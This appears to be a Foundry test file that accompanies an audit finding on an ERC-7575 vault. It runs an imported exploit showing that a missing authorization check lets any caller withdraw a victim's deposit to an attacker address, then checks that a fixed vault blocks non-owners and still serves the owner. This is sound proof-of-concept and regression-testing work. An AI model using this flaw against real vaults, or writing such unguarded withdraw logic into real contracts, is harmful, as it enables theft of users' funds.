// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    WERC7575Vault,
    WERC7575VaultFixed,
    WERC7575ShareToken,
    MiniAsset,
    IShareToken,
    IERC20Errors
} from "./65495-h-01-missing-authorization-check-allows-unauthorized-fund-wi.sol";

contract MissingWithdrawAuthTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x000000000000000000000000000000000000a11c;
    uint256 internal constant DEPOSIT = 1000 ether;

    // ── Bug: any caller withdraws a victim's deposit to themselves ──────────
    function test_exploit_unauthorizedWithdrawal_stealsVictimDeposit() public {
        Exploit e = new Exploit();
        e.run();

        MiniAsset asset = MiniAsset(e.assetAddr());
        WERC7575ShareToken share = WERC7575ShareToken(e.shareAddr());

        // Attacker (never the owner) received the victim's entire underlying.
        assertEq(e.attackerStolen(), DEPOSIT, "attacker did not steal the deposit");
        assertEq(asset.balanceOf(ATTACKER), DEPOSIT, "attacker asset balance != stolen deposit");

        // The victim's shares were burned and the vault drained.
        assertEq(e.victimSharesBefore(), DEPOSIT, "victim should start with shares");
        assertEq(e.victimSharesAfter(), 0, "victim shares not burned");
        assertEq(share.balanceOf(VICTIM), 0, "victim still holds shares");
        assertEq(asset.balanceOf(e.vaultAddr()), 0, "vault retains assets");
    }

    // ── Negative control: the report's fix reverts a non-owner caller ───────
    function test_control_fixedVault_revertsUnauthorizedCaller() public {
        MiniAsset asset = new MiniAsset("Underlying", "STOLEN-ASSET");
        WERC7575ShareToken share = new WERC7575ShareToken();
        WERC7575VaultFixed vault = new WERC7575VaultFixed(address(asset), IShareToken(address(share)));
        share.registerVault(address(vault));

        // Identical victim position.
        asset.mint(address(vault), DEPOSIT);
        share.mintTo(VICTIM, DEPOSIT);
        share.seedSelfAllowance(VICTIM, type(uint256).max);

        // This test contract is msg.sender != VICTIM → the added auth gate reverts.
        vm.expectRevert(abi.encodeWithSelector(IERC20Errors.ERC20InvalidSender.selector, address(this)));
        vault.withdraw(DEPOSIT, ATTACKER, VICTIM);

        // Nothing was stolen or burned.
        assertEq(asset.balanceOf(ATTACKER), 0, "fixed vault leaked assets");
        assertEq(share.balanceOf(VICTIM), DEPOSIT, "fixed vault burned victim shares");
        assertEq(asset.balanceOf(address(vault)), DEPOSIT, "fixed vault lost custody");
    }

    // ── Positive control: the legitimate owner CAN withdraw on the fixed vault ─
    function test_control_fixedVault_ownerWithdrawSucceeds() public {
        MiniAsset asset = new MiniAsset("Underlying", "STOLEN-ASSET");
        WERC7575ShareToken share = new WERC7575ShareToken();
        WERC7575VaultFixed vault = new WERC7575VaultFixed(address(asset), IShareToken(address(share)));
        share.registerVault(address(vault));

        asset.mint(address(vault), DEPOSIT);
        share.mintTo(VICTIM, DEPOSIT);
        share.seedSelfAllowance(VICTIM, type(uint256).max);

        // The owner (VICTIM) withdraws to themselves — permitted, no theft.
        vm.prank(VICTIM);
        vault.withdraw(DEPOSIT, VICTIM, VICTIM);

        assertEq(asset.balanceOf(VICTIM), DEPOSIT, "owner did not receive their assets");
        assertEq(share.balanceOf(VICTIM), 0, "owner shares not burned");
    }
}
